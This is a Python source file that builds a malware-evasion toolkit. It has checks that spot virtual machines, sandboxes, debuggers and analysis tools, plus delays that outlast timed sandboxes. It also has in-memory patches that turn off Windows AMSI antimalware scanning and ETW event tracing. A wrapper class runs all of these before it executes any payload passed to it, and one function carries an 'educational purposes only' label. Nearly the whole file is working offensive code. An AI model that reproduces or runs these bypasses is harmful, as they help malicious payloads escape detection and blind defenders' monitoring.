#!/usr/bin/env python3
"""
Advanced Evasion Techniques
Techniques to evade detection, sandboxes, and automated analysis
"""

import os
import sys
import time
import platform
import subprocess
import ctypes
import random
from typing import Optional, List, Dict
from datetime import datetime


class EvasionTechniques:
    """
    Advanced evasion techniques including:
    - VM/Sandbox detection
    - YARA rule evasion
    - Behavioral analysis evasion
    - User interaction checks
    - AMSI bypass (Windows)
    """
    
    @staticmethod
    def detect_vm() -> bool:
        """
        Detect if running in virtual machine
        
        Returns:
            True if VM detected
        """
        vm_indicators = []
        
        # Check common VM artifacts
        if platform.system() == 'Windows':
            # Check for VM processes
            vm_processes = [
                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                'vbox.exe', 'vboxservice.exe', 'vboxtray.exe',
                'xenservice.exe'
            ]
            
            try:
                result = subprocess.run(
                    ['tasklist'],
                    capture_output=True,
                    text=True
                )
                
                for proc in vm_processes:
                    if proc.lower() in result.stdout.lower():
                        vm_indicators.append(f"Process: {proc}")
            except:
                pass
            
            # Check registry for VM indicators
            vm_reg_keys = [
                r'HKLM\SOFTWARE\VMware, Inc.\VMware Tools',
                r'HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions',
            ]
            
            for key in vm_reg_keys:
                try:
                    result = subprocess.run(
                        ['reg', 'query', key],
                        capture_output=True,
                        text=True
                    )
                    if result.returncode == 0:
                        vm_indicators.append(f"Registry: {key}")
                except:
                    pass
        
        # Check for VM hardware (BIOS, disk, etc.)
        try:
            if platform.system() == 'Windows':
                # Check BIOS manufacturer
                result = subprocess.run(
                    ['wmic', 'bios', 'get', 'manufacturer'],
                    capture_output=True,
                    text=True
                )
                
                vm_vendors = ['vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v']
                for vendor in vm_vendors:
                    if vendor in result.stdout.lower():
                        vm_indicators.append(f"BIOS: {vendor}")
        except:
            pass
        
        return len(vm_indicators) > 0
    
    @staticmethod
    def detect_sandbox() -> bool:
        """
        Detect if running in sandbox environment
        
        Returns:
            True if sandbox detected
        """
        sandbox_indicators = []
        
        # Check for limited resources (common in sandboxes)
        try:
            import psutil
            
            # Low CPU count
            if psutil.cpu_count() < 2:
                sandbox_indicators.append("Low CPU count")
            
            # Low RAM
            ram_gb = psutil.virtual_memory().total / (1024 ** 3)
            if ram_gb < 2:
                sandbox_indicators.append("Low RAM")
            
            # Check uptime (sandboxes often have recent boot time)
            uptime_hours = (time.time() - psutil.boot_time()) / 3600
            if uptime_hours < 0.5:  # Less than 30 minutes
                sandbox_indicators.append("Recent boot")
        
        except ImportError:
            pass
        
        # Check for analysis tools
        analysis_processes = [
            'wireshark.exe', 'fiddler.exe', 'procmon.exe', 'procmon64.exe',
            'procexp.exe', 'procexp64.exe', 'autoruns.exe', 'autorunsc.exe',
            'tcpview.exe', 'ollydbg.exe', 'x64dbg.exe', 'idaq.exe', 'idaq64.exe'
        ]
        
        if platform.system() == 'Windows':
            try:
                result = subprocess.run(
                    ['tasklist'],
                    capture_output=True,
                    text=True
                )
                
                for proc in analysis_processes:
                    if proc.lower() in result.stdout.lower():
                        sandbox_indicators.append(f"Analysis tool: {proc}")
            except:
                pass
        
        return len(sandbox_indicators) > 0
    
    @staticmethod
    def detect_debugger() -> bool:
        """
        Detect if a debugger is attached
        
        Returns:
            True if debugger detected
        """
        if platform.system() == 'Windows':
            try:
                # IsDebuggerPresent API
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent():
                    return True
            except:
                pass
        
        # Check for debugger environment variables
        debugger_vars = ['_', 'PYTHONBREAKPOINT', 'PYDEVD_USE_FRAME_EVAL']
        for var in debugger_vars:
            if var in os.environ:
                return True
        
        return False
    
    @staticmethod
    def check_user_interaction() -> bool:
        """
        Check if real user is interacting (not automated sandbox)
        Sandboxes typically don't have mouse movement
        
        Returns:
            True if user interaction detected
        """
        try:
            if platform.system() == 'Windows':
                from ctypes import Structure, c_long, windll, byref
                
                class POINT(Structure):
                    _fields_ = [("x", c_long), ("y", c_long)]
                
                # Get initial mouse position
                pt1 = POINT()
                windll.user32.GetCursorPos(byref(pt1))
                
                # Wait a bit
                time.sleep(2)
                
                # Get new position
                pt2 = POINT()
                windll.user32.GetCursorPos(byref(pt2))
                
                # Check if mouse moved
                if (pt1.x != pt2.x) or (pt1.y != pt2.y):
                    return True
            
            return False
        
        except:
            return False
    
    @staticmethod
    def timing_evasion(min_seconds: int = 60) -> bool:
        """
        Delay execution to evade time-limited sandboxes
        Most sandboxes run for 60-300 seconds
        
        Args:
            min_seconds: Minimum seconds to wait
        
        Returns:
            True if completed wait
        """
        # Sleep in small increments to appear more natural
        chunks = min_seconds // 10
        for i in range(chunks):
            time.sleep(10 + random.randint(0, 5))
        
        return True
    
    @staticmethod
    def amsi_bypass() -> bool:
        """
        Bypass Windows AMSI (Antimalware Scan Interface)
        WARNING: For educational purposes only!
        
        Returns:
            True if bypass successful
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            # Classic AMSI bypass technique
            # Patches amsi.dll in memory to always return success
            
            amsi = ctypes.windll.amsi
            kernel32 = ctypes.windll.kernel32
            
            # Get AmsiScanBuffer address
            amsi_scan_buffer = amsi.AmsiScanBuffer
            
            # Change memory protection to RWX
            old_protect = ctypes.c_ulong()
            kernel32.VirtualProtect(
                amsi_scan_buffer,
                5,
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )
            
            # Patch with return 0 (success)
            patch = b'\xB8\x00\x00\x00\x00\xC3'  # mov eax, 0; ret
            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
            
            # Restore original protection
            kernel32.VirtualProtect(
                amsi_scan_buffer,
                5,
                old_protect.value,
                ctypes.byref(old_protect)
            )
            
            return True
        
        except Exception as e:
            return False
    
    @staticmethod
    def etw_bypass() -> bool:
        """
        Bypass Windows ETW (Event Tracing for Windows)
        
        Returns:
            True if bypass successful
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            # Disable ETW by patching EtwEventWrite
            ntdll = ctypes.windll.ntdll
            kernel32 = ctypes.windll.kernel32
            
            # Get EtwEventWrite address
            etw_event_write = ntdll.EtwEventWrite
            
            # Patch with return
            old_protect = ctypes.c_ulong()
            kernel32.VirtualProtect(
                etw_event_write,
                1,
                0x40,
                ctypes.byref(old_protect)
            )
            
            patch = b'\xC3'  # ret
            ctypes.memmove(etw_event_write, patch, len(patch))
            
            kernel32.VirtualProtect(
                etw_event_write,
                1,
                old_protect.value,
                ctypes.byref(old_protect)
            )
            
            return True
        
        except:
            return False


class StealthExecution:
    """
    Combine evasion techniques for maximum stealth
    """
    
    def __init__(self, paranoid_mode: bool = False):
        """
        Initialize stealth execution
        
        Args:
            paranoid_mode: Enable all evasion checks
        """
        self.paranoid_mode = paranoid_mode
        self.checks_passed = {}
    
    def pre_execution_checks(self) -> bool:
        """
        Run all evasion checks before executing payload
        
        Returns:
            True if safe to execute, False if threat detected
        """
        evasion = EvasionTechniques()
        
        print("🔍 Running stealth checks...")
        
        # VM detection
        vm_detected = evasion.detect_vm()
        self.checks_passed['vm'] = not vm_detected
        print(f"   {'✗' if vm_detected else '✓'} VM Check: {'DETECTED' if vm_detected else 'Clear'}")
        
        # Sandbox detection
        sandbox_detected = evasion.detect_sandbox()
        self.checks_passed['sandbox'] = not sandbox_detected
        print(f"   {'✗' if sandbox_detected else '✓'} Sandbox Check: {'DETECTED' if sandbox_detected else 'Clear'}")
        
        # Debugger detection
        debugger_detected = evasion.detect_debugger()
        self.checks_passed['debugger'] = not debugger_detected
        print(f"   {'✗' if debugger_detected else '✓'} Debugger Check: {'DETECTED' if debugger_detected else 'Clear'}")
        
        # In paranoid mode, also check user interaction
        if self.paranoid_mode:
            print("   ⏳ Waiting for user interaction...")
            user_interaction = evasion.check_user_interaction()
            self.checks_passed['user_interaction'] = user_interaction
            print(f"   {'✓' if user_interaction else '✗'} User Interaction: {'Detected' if user_interaction else 'None'}")
        
        # Determine if safe to execute
        if vm_detected or sandbox_detected or debugger_detected:
            print("\n❌ THREAT DETECTED - Aborting execution")
            return False
        
        if self.paranoid_mode and not user_interaction:
            print("\n❌ No user interaction - Possible sandbox")
            return False
        
        print("\n✓ All checks passed - Safe to execute")
        return True
    
    def execute_with_evasion(self, payload_func, *args, **kwargs):
        """
        Execute payload with full evasion techniques
        
        Args:
            payload_func: Function to execute
            *args, **kwargs: Arguments for payload function
        
        Returns:
            Result of payload function or None if aborted
        """
        # Pre-execution checks
        if not self.pre_execution_checks():
            return None
        
        # Apply bypasses (Windows only)
        if platform.system() == 'Windows':
            print("\n🛡️  Applying Windows bypasses...")
            if EvasionTechniques.amsi_bypass():
                print("   ✓ AMSI bypassed")
            if EvasionTechniques.etw_bypass():
                print("   ✓ ETW bypassed")
        
        # Add random delay to evade time-based analysis
        if self.paranoid_mode:
            print("\n⏳ Timing evasion delay...")
            time.sleep(random.randint(5, 15))
        
        # Execute payload
        print("\n🚀 Executing payload...")
        return payload_func(*args, **kwargs)


def test_evasion():
    """Test evasion techniques"""
    print("=" * 60)
    print("EVASION TECHNIQUES TEST")
    print("=" * 60)
    
    stealth = StealthExecution(paranoid_mode=False)
    
    # Define test payload
    def test_payload():
        print("   Payload executed successfully!")
        return "Success"
    
    # Execute with evasion
    result = stealth.execute_with_evasion(test_payload)
    
    print("\n" + "=" * 60)
    print(f"Result: {result}")


if __name__ == '__main__':
    test_evasion()
